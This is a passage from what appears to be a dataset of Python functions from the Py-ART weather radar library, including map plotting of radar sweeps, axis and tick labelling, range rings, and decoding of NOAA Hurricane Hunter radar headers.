        data = np.ma.masked_outside(data, vmin, vmax)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(x, z, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if title_flag:
        self._set_title(field, sweep, title, ax)
    if axislabels_flag:
        self._label_axes_rhi(axislabels, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,label_xaxis_x,"def label_xaxis_x(self, ax=None):
    """"""Label the xaxis with the default label for x units.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Horizontal distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_y,"def label_yaxis_y(self, ax=None):
    """"""Label the yaxis with the default label for y units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('Horizontal distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_z,"def label_yaxis_z(self, ax=None):
    """"""Label the yaxis with the default label for z units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('Distance Above ' + self.origin + '  (km)')"
ARM-DOE/pyart,_get_x_z,"def _get_x_z(self, sweep, edges, filter_transitions, ignoreTilt=False):
    """"""Retrieve and return x and z coordinate in km.""""""
    (x, _, z) = self._get_x_y_z(sweep, edges, filter_transitions, ignoreTilt=ignoreTilt)
    return (x, z)"
ARM-DOE/pyart,_get_x_y_z,"def _get_x_y_z(self, sweep, edges, filter_transitions, ignoreTilt=False):
    """"""Retrieve and return x, y, and z coordinate in km.""""""
    sweep_slice = self._radar.get_slice(sweep)
    if self._radar.metadata['platform_type'] == 'aircraft_belly':
        if filter_transitions and self.antenna_transition is not None:
            in_trans = self.antenna_transition[sweep_slice]
            ranges = self.ranges
            azimuths = self.azimuths[in_trans == 0]
            elevations = self.elevations[in_trans == 0]
        else:
            ranges = self.ranges
            azimuths = self.azimuths[sweep_slice]
            elevations = self.elevations[sweep_slice]
        if edges:
            if len(ranges) != 1:
                ranges = transforms._interpolate_range_edges(ranges)
            if len(elevations) != 1:
                elevations = transforms._interpolate_elevation_edges(elevations)
            if len(azimuths) != 1:
                azimuths = transforms._interpolate_azimuth_edges(azimuths)
        (rg, azg) = np.meshgrid(ranges, azimuths)
        (rg, eleg) = np.meshgrid(ranges, elevations)
        (x, y, z) = antenna_to_cartesian(rg / 1000.0, azg, eleg)
    else:
        if filter_transitions and self.antenna_transition is not None:
            in_trans = self.antenna_transition[sweep_slice]
            ranges = self.ranges
            rotation = self.rotation[in_trans == 0]
            roll = self.roll[in_trans == 0]
            drift = self.drift[in_trans == 0]
            tilt = self.tilt[in_trans == 0]
            pitch = self.pitch[in_trans == 0]
        else:
            ranges = self.ranges
            rotation = self.rotation[sweep_slice]
            roll = self.roll[sweep_slice]
            drift = self.drift[sweep_slice]
            tilt = self.tilt[sweep_slice]
            pitch = self.pitch[sweep_slice]
        if ignoreTilt:
            tilt = tilt * 0.0
        if edges:
            if len(ranges) != 1:
                ranges = transforms._interpolate_range_edges(ranges)
            if len(rotation) != 1:
                rotation = transforms._interpolate_azimuth_edges(rotation)
                roll = transforms._interpolate_azimuth_edges(roll)
                drift = transforms._interpolate_azimuth_edges(drift)
                tilt = transforms._interpolate_azimuth_edges(tilt)
                pitch = transforms._interpolate_azimuth_edges(pitch)
        (rg, rotg) = np.meshgrid(ranges, rotation)
        (rg, rollg) = np.meshgrid(ranges, roll)
        (rg, driftg) = np.meshgrid(ranges, drift)
        (rg, tiltg) = np.meshgrid(ranges, tilt)
        (rg, pitchg) = np.meshgrid(ranges, pitch)
        (x, y, z) = antenna_to_cartesian_track_relative(rg / 1000.0, rotg, rollg, driftg, tiltg, pitchg)
    x = (x + self.shift[0]) / 1000.0
    y = (y + self.shift[1]) / 1000.0
    z = z / 1000.0
    return (x, y, z)"
ARM-DOE/pyart,find_side,"def find_side(ls, side):
    """"""
    Given a shapely LineString which is assumed to be rectangular, return the
    line corresponding to a given side of the rectangle.
    """"""
    (minx, miny, maxx, maxy) = ls.bounds
    points = {'left': [(minx, miny), (minx, maxy)], 'right': [(maxx, miny), (maxx, maxy)], 'bottom': [(minx, miny), (maxx, miny)], 'top': [(minx, maxy), (maxx, maxy)]}
    return sgeom.LineString(points[side])"
ARM-DOE/pyart,lambert_xticks,"def lambert_xticks(ax, ticks):
    """"""Draw ticks on the bottom x-axis of a Lambert Conformal projection.""""""

    def te(xy):
        return xy[0]

    def lc(t, n, b):
        return np.vstack((np.zeros(n) + t, np.linspace(b[2], b[3], n))).T
    (xticks, xticklabels) = _lambert_ticks(ax, ticks, 'bottom', lc, te)
    ax.xaxis.tick_bottom()
    ax.set_xticks(xticks)
    ax.set_xticklabels([ax.xaxis.get_major_formatter()(xtick) for xtick in xticklabels])"
ARM-DOE/pyart,lambert_yticks,"def lambert_yticks(ax, ticks):
    """"""Draw ticks on the left y-axis of a Lambert Conformal projection.""""""

    def te(xy):
        return xy[1]

    def lc(t, n, b):
        return np.vstack((np.linspace(b[0], b[1], n), np.zeros(n) + t)).T
    (yticks, yticklabels) = _lambert_ticks(ax, ticks, 'left', lc, te)
    ax.yaxis.tick_left()
    ax.set_yticks(yticks)
    ax.set_yticklabels([ax.yaxis.get_major_formatter()(ytick) for ytick in yticklabels])"
ARM-DOE/pyart,_lambert_ticks,"def _lambert_ticks(ax, ticks, tick_location, line_constructor, tick_extractor):
    """"""
    Get the tick locations and labels for a Lambert Conformal projection.
    """"""
    outline_patch = sgeom.LineString(ax.spines['geo'].get_path().vertices.tolist())
    axis = find_side(outline_patch, tick_location)
    n_steps = 30
    extent = ax.get_extent(cartopy.crs.PlateCarree())
    _ticks = []
    for t in ticks:
        xy = line_constructor(t, n_steps, extent)
        proj_xyz = ax.projection.transform_points(cartopy.crs.Geodetic(), xy[:, 0], xy[:, 1])
        xyt = proj_xyz[..., :2]
        ls = sgeom.LineString(xyt.tolist())
        locs = axis.intersection(ls)
        if not locs:
            tick = [None]
        else:
            try:
                tick = tick_extractor(locs.xy)
            except AttributeError:
                tick = [None]
        _ticks.append(tick[0])
    ticklabels = copy(ticks)
    while True:
        try:
            index = _ticks.index(None)
        except ValueError:
            break
        _ticks.pop(index)
        ticklabels = np.delete(ticklabels, index)
    return (_ticks, ticklabels)"
ARM-DOE/pyart,__init__,"def __init__(self, radar, shift=(0.0, 0.0), grid_projection=None):
    """"""Initialize the object.""""""
    if not _CARTOPY_AVAILABLE:
        raise MissingOptionalDependency('Cartopy is required to use RadarMapDisplay but is not installed')
    RadarDisplay.__init__(self, radar, shift=shift)
    if grid_projection is None:
        lat_0 = self.loc[0]
        lon_0 = self.loc[1]
        grid_projection = cartopy.crs.AzimuthalEquidistant(central_longitude=lon_0, central_latitude=lat_0)
    elif not isinstance(grid_projection, cartopy.crs.Projection):
        raise TypeError('grid_projection keyword must be a cartopy.crs object')
    self.grid_projection = grid_projection
    self.ax = None
    self._x0 = None
    self._y0 = None"
ARM-DOE/pyart,_check_ax,"def _check_ax(self):
    """"""Check that a GeoAxes object exists, raise ValueError if not""""""
    if self.ax is None:
        raise ValueError('no GeoAxes plotted')"
ARM-DOE/pyart,plot_ppi_map,"def plot_ppi_map(self, field, sweep=0, mask_tuple=None, vmin=None, vmax=None, cmap=None, norm=None, mask_outside=False, title=None, title_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', ax=None, fig=None, lat_lines=None, lon_lines=None, projection=None, min_lon=None, max_lon=None, min_lat=None, max_lat=None, width=None, height=None, lon_0=None, lat_0=None, resolution='110m', shapefile=None, shapefile_kwargs=None, edges=True, gatefilter=None, filter_transitions=True, embellish=True, add_grid_lines=True, raster=False, ticks=None, ticklabs=None, alpha=None, edgecolors='face', **kwargs):
    """"""
        Plot a PPI volume sweep onto a geographic map.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int, optional
            Sweep number to plot.

        Other Parameters
        ----------------
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and tilt parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        ax : Cartopy GeoAxes instance
            If None, create GeoAxes instance using other keyword info.
            If provided, ax must have a Cartopy crs projection and projection
            kwarg below is ignored.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        lat_lines, lon_lines : array or None
            Locations at which to draw latitude and longitude lines.
            None will use default values which are resonable for maps of
            North America.
        projection : cartopy.crs class
            Map projection supported by cartopy. Used for all subsequent calls
            to the GeoAxes object generated. Defaults to LambertConformal
            centered on radar.
        min_lat, max_lat, min_lon, max_lon : float
            Latitude and longitude ranges for the map projection region in
            degrees.
        width, height : float
            Width and height of map domain in meters.
            Only this set of parameters or the previous set of parameters
            (min_lat, max_lat, min_lon, max_lon) should be specified.
            If neither set is specified then the map domain will be determined
            from the extend of the radar gate locations.
        shapefile : str
            Filename for a shapefile to add to map.
        shapefile_kwargs : dict
            Key word arguments used to format shapefile. Projection defaults
            to lat lon (cartopy.crs.PlateCarree())
        resolution : '10m', '50m', '110m'.
            Resolution of NaturalEarthFeatures to use. See Cartopy
            documentation for details.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        embellish: bool
            True by default. Set to False to supress drawing of coastlines
            etc.. Use for speedup when specifying shapefiles.
        add_grid_lines : bool
            True by default. Set to False to supress drawing of lat/lon lines
            Note that lat lon labels only work with certain projections.
        raster : bool
            False by default. Set to true to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas. Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).
        alpha : float or None
            Set the alpha tranparency of the radar plot. Useful for
            overplotting radar over other datasets.
        edgecolor : str
            Set the behavior of the edges of the pixels, by default
            it will color them the same as the pixels (faces).
        **kwargs : additional keyword arguments to pass to pcolormesh.

        """"""
    (vmin, vmax) = parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = parse_cmap(cmap, field)
    lat_0 = self.loc[0]
    lon_0 = self.loc[1]
    data = self._get_data(field, sweep, mask_tuple, filter_transitions, gatefilter)
    (x, y) = self._get_x_y(sweep, edges, filter_transitions)
    if mask_outside:
        data = np.ma.masked_outside(data, vmin, vmax)
    if fig is None:
        fig = plt.gcf()
    if ax is not None:
        if hasattr(ax, 'projection'):
            projection = ax.projection
        else:
            if projection is None:
                projection = cartopy.crs.LambertConformal(central_longitude=lon_0, central_latitude=lat_0)
                warnings.warn('No projection was defined for the axes.' + ' Overridding defined axes and using default ' + 'axes with projection Lambert Conformal.', UserWarning)
            with warnings.catch_warnings():
                warnings.filterwarnings('ignore')
                ax = plt.axes(projection=projection)
    else:
        if projection is None:
            projection = cartopy.crs.LambertConformal(central_longitude=lon_0, central_latitude=lat_0)
            warnings.warn('No projection was defined for the axes.' + ' Overridding defined axes and using default ' + 'axes with projection Lambert Conformal.', UserWarning)
        with warnings.catch_warnings():
            warnings.filterwarnings('ignore')
            ax = plt.axes(projection=projection)
    if min_lon is not None:
        ax.set_extent([min_lon, max_lon, min_lat, max_lat], crs=cartopy.crs.PlateCarree())
    elif width is not None and height is not None:
        ax.set_extent([-width / 2.0, width / 2.0, -height / 2.0, height / 2.0], crs=self.grid_projection)
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(x * 1000.0, y * 1000.0, data, alpha=alpha, vmin=vmin, vmax=vmax, cmap=cmap, edgecolors=edgecolors, norm=norm, transform=self.grid_projection, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if embellish is True:
        states_provinces = cartopy.feature.NaturalEarthFeature(category='cultural', name='admin_1_states_provinces_lines', scale=resolution, facecolor='none')
        ax.coastlines(resolution=resolution)
        ax.add_feature(states_provinces, edgecolor='gray')
    if add_grid_lines:
        if lat_lines is None:
            lat_lines = np.arange(30, 46, 1)
        if lon_lines is None:
            lon_lines = np.arange(-110, -75, 1)
        if ax.projection in [cartopy.crs.PlateCarree(), cartopy.crs.Mercator()]:
            gl = ax.gridlines(xlocs=lon_lines, ylocs=lat_lines, draw_labels=True)
            gl.top_labels = False
            gl.right_labels = False
        elif isinstance(ax.projection, cartopy.crs.LambertConformal):
            ax.figure.canvas.draw()
            ax.gridlines(xlocs=lon_lines, ylocs=lat_lines)
            ax.xaxis.set_major_formatter(cartopy.mpl.gridliner.LONGITUDE_FORMATTER)
            ax.yaxis.set_major_formatter(cartopy.mpl.gridliner.LATITUDE_FORMATTER)
            if _LAMBERT_GRIDLINES:
                lambert_xticks(ax, lon_lines)
                lambert_yticks(ax, lat_lines)
        else:
            ax.gridlines(xlocs=lon_lines, ylocs=lat_lines)
    if shapefile is not None:
        from cartopy.io.shapereader import Reader
        if shapefile_kwargs is None:
            shapefile_kwargs = {}
        if 'crs' not in shapefile_kwargs:
            shapefile_kwargs['crs'] = cartopy.crs.PlateCarree()
        ax.add_geometries(Reader(shapefile).geometries(), **shapefile_kwargs)
    if title_flag:
        self._set_title(field, sweep, title, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, fig=fig, ax=ax, ticks=ticks, ticklabs=ticklabs)
    self.ax = ax"
ARM-DOE/pyart,plot_point,"def plot_point(self, lon, lat, symbol='ro', label_text=None, label_offset=(None, None), **kwargs):
    """"""
        Plot a point on the current map.

        Additional arguments are passed to ax.plot.

        Parameters
        ----------
        lon : float
            Longitude of point to plot.
        lat : float
            Latitude of point to plot.
        symbol : str
            Matplotlib compatible string which specified the symbol of the
            point.
        label_text : str, optional.
            Text to label symbol with. If None no label will be added.
        label_offset : [float, float]
            Offset in lon, lat degrees for the bottom left corner of the label
            text relative to the point. A value of None will use 0.01.

        """"""
    self._check_ax()
    (lon_offset, lat_offset) = label_offset
    if lon_offset is None:
        lon_offset = 0.01
    if lat_offset is None:
        lat_offset = 0.01
    if 'transform' not in kwargs:
        kwargs['transform'] = cartopy.crs.PlateCarree()
    self.ax.plot(lon, lat, symbol, **kwargs)
    if label_text is not None:
        (x_text, y_text) = self.ax.projection.transform_point(lon + lon_offset, lat + lat_offset, src_crs=kwargs['transform'])
        self.ax.annotate(label_text, xy=(x_text, y_text))"
ARM-DOE/pyart,plot_line_geo,"def plot_line_geo(self, line_lons, line_lats, line_style='r-', **kwargs):
    """"""
        Plot a line segments on the current map given values in lat and lon.

        Additional arguments are passed to ax.plot.

        Parameters
        ----------
        line_lons : array
            Longitude of line segment to plot.
        line_lats : array
            Latitude of line segment to plot.
        line_style : str
            Matplotlib compatible string which specifies the line style.

        """"""
    self._check_ax()
    if 'transform' not in kwargs:
        kwargs['transform'] = cartopy.crs.PlateCarree()
    self.ax.plot(line_lons, line_lats, line_style, **kwargs)"
ARM-DOE/pyart,plot_line_xy,"def plot_line_xy(self, line_x, line_y, color='r', line_style='-', **kwargs):
    """"""
        Plot a line segments on the current map given radar x, y values.

        Additional arguments are passed to ax.plot.

        Parameters
        ----------
        line_x : array
            X location of points to plot in meters from the radar.
        line_y : array
            Y location of points to plot in meters from the radar.
        color : str, optional
            Matplotlib compatible string which specifies the color for the
            line style.
        line_style : str, optional
            Matplotlib compatible string which specifies the line style.

        """"""
    self._check_ax()
    if 'transform' not in kwargs:
        kwargs['transform'] = self.grid_projection
    self.ax.plot(line_x, line_y, color, line_style, **kwargs)"
ARM-DOE/pyart,plot_range_ring,"def plot_range_ring(self, range_ring_location_km, npts=360, color='k', line_style='-', **kwargs):
    """"""
        Plot a single range ring on the map.

        Additional arguments are passed to ax.plot.

        Parameters
        ----------
        range_ring_location_km : float
            Location of range ring in km.
        npts : int
            Number of points in the ring, higher for better resolution.
        color : str, optional
            Matplotlib compatible string which specifies the color for the
            line style.
        line_style : str, optional
            Matplotlib compatible string which specified the line
            style of the ring.

        """"""
    if 'col' in kwargs:
        color = kwargs.pop('col')
        kwargs['c'] = color
    if 'ax' in kwargs:
        kwargs.pop('ax')
    self._check_ax()
    angle = np.linspace(0.0, 2.0 * np.pi, npts)
    xpts = range_ring_location_km * 1000.0 * np.sin(angle)
    ypts = range_ring_location_km * 1000.0 * np.cos(angle)
    self.plot_line_xy(xpts, ypts, color=color, line_style=line_style, **kwargs)"
ARM-DOE/pyart,te,"def te(xy):
    return xy[0]"
ARM-DOE/pyart,lc,"def lc(t, n, b):
    return np.vstack((np.zeros(n) + t, np.linspace(b[2], b[3], n))).T"
ARM-DOE/pyart,te,"def te(xy):
    return xy[1]"
ARM-DOE/pyart,lc,"def lc(t, n, b):
    return np.vstack((np.linspace(b[0], b[1], n), np.zeros(n) + t)).T"
ARM-DOE/pyart,__init__,"def __init__(self, radar, shift=(0.0, 0.0)):
    """"""Initialize the object.""""""
    if not _BASEMAP_AVAILABLE:
        raise MissingOptionalDependency('Basemap is required to use RadarMapDisplayBasemap but is not ' + 'installed')
    warnings.warn('RadarMapDisplayBasemap is deprecated in favor of ' + 'RadarMapDisplay. Basemap is still optional to use, ' + 'but there will be no support if an error appears.', DeprecationWarning)
    RadarDisplay.__init__(self, radar, shift=shift)
    self.basemap = None
    self._x0 = None
    self._y0 = None
    return"
ARM-DOE/pyart,_check_basemap,"def _check_basemap(self):
    """"""Check that basemap is not None, raise ValueError if it is.""""""
    if self.basemap is None:
        raise ValueError('no basemap plotted')"
ARM-DOE/pyart,plot_ppi_map,"def plot_ppi_map(self, field, sweep=0, mask_tuple=None, vmin=None, vmax=None, cmap=None, norm=None, mask_outside=False, title=None, title_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', ax=None, fig=None, lat_lines=None, lon_lines=None, projection='lcc', area_thresh=10000, min_lon=None, max_lon=None, min_lat=None, max_lat=None, width=None, height=None, lon_0=None, lat_0=None, resolution='h', shapefile=None, edges=True, gatefilter=None, basemap=None, filter_transitions=True, embellish=True, ticks=None, ticklabs=None, raster=False, alpha=None, edgecolors='face', **kwargs):
    """"""
        Plot a PPI volume sweep onto a geographic map.

        Additional arguments are passed to Basemap.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int, optional
            Sweep number to plot.

        Other Parameters
        ----------------
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data.  If not
            None the vmax and vmin parameters are ignored.  If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax.  False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and tilt parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        colorbar_flag : bool
            True to add a colorbar with label to the axis.  False leaves off
            the colorbar.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
                Colorbar custom tick labels.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        lat_lines, lon_lines : array or None
            Locations at which to draw latitude and longitude lines.
            None will use default values which are resonable for maps of
            North America.
        projection : str
            Map projection supported by basemap.  The use of cylindrical
            projections (mill, merc, etc) is not recommended as they
            exhibit large distortions at high latitudes.  Equal area
            (aea, laea), conformal (lcc, tmerc, stere) or equidistant
            projection (aeqd, cass) work well even at high latitudes.
            The cylindrical equidistant projection (cyl) is not supported as
            coordinate transformations cannot be performed.
        area_thresh : float
            Coastline or lake with an area smaller than area_thresh in
            km^2 will not be plotted.
        min_lat, max_lat, min_lon, max_lon : float
            Latitude and longitude ranges for the map projection region in
            degrees.
        width, height : float
            Width and height of map domain in meters.
            Only this set of parameters or the previous set of parameters
            (min_lat, max_lat, min_lon, max_lon) should be specified.
            If neither set is specified then the map domain will be determined
            from the extend of the radar gate locations.
        lon_0, lat_0 : float
            Center of the map domain in degrees.  If the default, None is used
            the latitude and longitude of the radar will be used.
        shapefile : str
            Filename for a ESRI shapefile as background (untested).
        resolution : 'c', 'l', 'i', 'h', or 'f'.
            Resolution of boundary database to use. See Basemap documentation
            for details.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot.  False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate.  False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        embellish: bool
            True by default. Set to false to supress drawing of coastlines
            etc.. Use for speedup when specifying shapefiles.
        basemap: Basemap instance
            If None, create basemap instance using other keyword info.
            If not None, use the user-specifed basemap instance.
        raster : bool
            False by default.  Set to true to render the display as a raster
            rather than a vector in call to pcolormesh.  Saves time in plotting
            high resolution data over large areas.  Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).
        alpha : float or None
            Set the alpha tranparency of the radar plot. Useful for
            overplotting radar over other datasets.
        edgecolor : str
            Set the behavior of the edges of the pixels, by default
            it will color them the same as the pixels (faces).
        **kwargs : additional keyword arguments to pass to pcolormesh.

        """"""
    (ax, fig) = parse_ax_fig(ax, fig)
    (vmin, vmax) = parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = parse_cmap(cmap, field)
    if lat_lines is None:
        lat_lines = np.arange(30, 46, 1)
    if lon_lines is None:
        lon_lines = np.arange(-110, -75, 1)
    if lat_0 is None:
        lat_0 = self.loc[0]
    if lon_0 is None:
        lon_0 = self.loc[1]
    data = self._get_data(field, sweep, mask_tuple, filter_transitions, gatefilter)
    (x, y) = self._get_x_y(sweep, edges, filter_transitions)
    if mask_outside:
        data = np.ma.masked_outside(data, vmin, vmax)
    if type(basemap) != Basemap:
        using_corners = None not in [min_lon, min_lat, max_lon, max_lat]
        if using_corners:
            basemap = Basemap(llcrnrlon=min_lon, llcrnrlat=min_lat, urcrnrlon=max_lon, urcrnrlat=max_lat, lat_0=lat_0, lon_0=lon_0, projection=projection, area_thresh=area_thresh, resolution=resolution, ax=ax, **kwargs)
        else:
            if width is None:
                width = (x.max() - x.min()) * 1000.0
            if height is None:
                height = (y.max() - y.min()) * 1000.0
            basemap = Basemap(width=width, height=height, lon_0=lon_0, lat_0=lat_0, projection=projection, area_thresh=area_thresh, resolution=resolution, ax=ax, **kwargs)
    if basemap.projection == 'cyl':
        raise ValueError('The cylindrical equidistant projection is not supported')
    if embellish is True:
        basemap.drawcoastlines(linewidth=1.25)
        basemap.drawstates()
        basemap.drawparallels(lat_lines, labels=[True, False, False, False])
        basemap.drawmeridians(lon_lines, labels=[False, False, False, True])
    self.basemap = basemap
    (self._x0, self._y0) = basemap(self.loc[1], self.loc[0])
    if norm is not None:
        vmin = vmax = None
    pm = basemap.pcolormesh(self._x0 + x * 1000.0, self._y0 + y * 1000.0, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, alpha=alpha, edgecolors=edgecolors, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if shapefile is not None:
        basemap.readshapefile(shapefile, 'shapefile', ax=ax)
    if title_flag:
        self._set_title(field, sweep, title, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, fig=fig, ax=ax, ticks=ticks, ticklabs=ticklabs)
    return"
ARM-DOE/pyart,plot_point,"def plot_point(self, lon, lat, symbol='ro', label_text=None, label_offset=(None, None), **kwargs):
    """"""
        Plot a point on the current map.

        Additional arguments are passed to basemap.plot.

        Parameters
        ----------
        lon : float
            Longitude of point to plot.
        lat : float
            Latitude of point to plot.
        symbol : str
            Matplotlib compatible string which specified the symbol of the
            point.
        label_text : str, optional.
            Text to label symbol with.  If None no label will be added.
        label_offset : [float, float]
            Offset in lon, lat degrees for the bottom left corner of the label
            text relative to the point. A value of None will use 0.01 de

        """"""
    self._check_basemap()
    (lon_offset, lat_offset) = label_offset
    if lon_offset is None:
        lon_offset = 0.01
    if lat_offset is None:
        lat_offset = 0.01
    self.basemap.plot(lon, lat, symbol, latlon=True, **kwargs)
    if label_text is not None:
        (x_text, y_text) = self.basemap(lon + lon_offset, lat + lat_offset)
        self.basemap.ax.text(x_text, y_text, label_text)"
ARM-DOE/pyart,plot_line_geo,"def plot_line_geo(self, line_lons, line_lats, line_style='r-', **kwargs):
    """"""
        Plot a line segments on the current map given values in lat and lon.

        Additional arguments are passed to basemap.plot.

        Parameters
        ----------
        line_lons : array
            Longitude of line segment to plot.
        line_lats : array
            Latitude of line segment to plot.
        line_style : str
            Matplotlib compatible string which specifies the line style.

        """"""
    self._check_basemap()
    self.basemap.plot(line_lons, line_lats, line_style, latlon=True, **kwargs)"
ARM-DOE/pyart,plot_line_xy,"def plot_line_xy(self, line_x, line_y, line_style='r-', **kwargs):
    """"""
        Plot a line segments on the current map given radar x, y values.

        Additional arguments are passed to basemap.plot.

        Parameters
        ----------
        line_x : array
            X location of points to plot in meters from the radar.
        line_y : array
            Y location of points to plot in meters from the radar.
        line_style : str, optional
            Matplotlib compatible string which specifies the line style.

        """"""
    self._check_basemap()
    self.basemap.plot(self._x0 + line_x, self._y0 + line_y, line_style, latlon=False, **kwargs)"
ARM-DOE/pyart,plot_range_ring,"def plot_range_ring(self, range_ring_location_km, npts=360, line_style='k-', **kwargs):
    """"""
        Plot a single range ring on the map.

        Additional arguments are passed to basemap.plot.

        Parameters
        ----------
        range_ring_location_km : float
            Location of range ring in km.
        npts: int
            Number of points in the ring, higher for better resolution.
        line_style : str
            Matplotlib compatible string which specified the line
            style of the ring.

        """"""
    if 'col' in kwargs:
        color = kwargs.pop('col')
        kwargs['c'] = color
    self._check_basemap()
    angle = np.linspace(0.0, 2.0 * np.pi, npts)
    xpts = range_ring_location_km * 1000.0 * np.sin(angle)
    ypts = range_ring_location_km * 1000.0 * np.cos(angle)
    self.plot_line_xy(xpts, ypts, line_style=line_style, **kwargs)"
ARM-DOE/pyart,_decode_noaa_hh_hdr,"def _decode_noaa_hh_hdr(raw_extended_headers, filemetadata, azimuth, elevation, position_source='irs', heading_source='irs'):
    """"""
    Extract data from Sigmet extended headers produced by NOAA
    Hurricane Hunter airborne radars.

    Parameters
    ----------
    raw_extended_headers : ndarray
        Raw Sigmet extended headers.
    filemetadata : FileMetadata
        FileMetadata class from which metadata will be derived.
    azimuth : dict
        Dictionary of azimuth angles recorded in Sigmet file.
    elevation : dict
        Dictionary of elevation angles recorded in Sigmet file.
    position_source: {'irs', 'gps', 'aamps'}, optional
        Instrument from which to derive position parameters.
    heading_source: {'irs', 'aamps'}
        Instrument from which to derive heading parameters.

    Returns
    -------
    latitude : dict
        Dictionary containing latitude data and metadata.
    longitude : dict
        Dictionary containing longitude data and metadata.
    altitude : dict
        Dictionary containing altitude data and metadata.
    heading_params : dict
        Dictionary of dictionary containing aircraft heading data and
        metadata. Contains 'heading', 'roll', pitch', 'drift', 'rotation',
        'tilt' and 'georefs_applied' dictionaries.

    """"""
    xhdr = np.frombuffer(raw_extended_headers[..., :68].tostring(), dtype=list(NOAA_HH_EXTENDED_HEADER))
    rotation = filemetadata('rotation')
    tilt = filemetadata('tilt')
    rotation_data = 90.0 - elevation['data'].copy()
    rotation_data[rotation_data < 0] += 360.0
    rotation['data'] = rotation_data
    tilt_data = azimuth['data'].copy()
    tilt_data[tilt_data > 180] -= 360.0
    tilt['data'] = tilt_data
    heading = filemetadata('heading')
    roll = filemetadata('roll')
    pitch = filemetadata('pitch')
    drift = filemetadata('drift')
    if heading_source == 'irs':
        heading_data = bin2_to_angle(xhdr['irs_heading'])
        roll_data = bin2_to_angle(xhdr['irs_roll'])
        pitch_data = bin2_to_angle(xhdr['irs_pitch'])
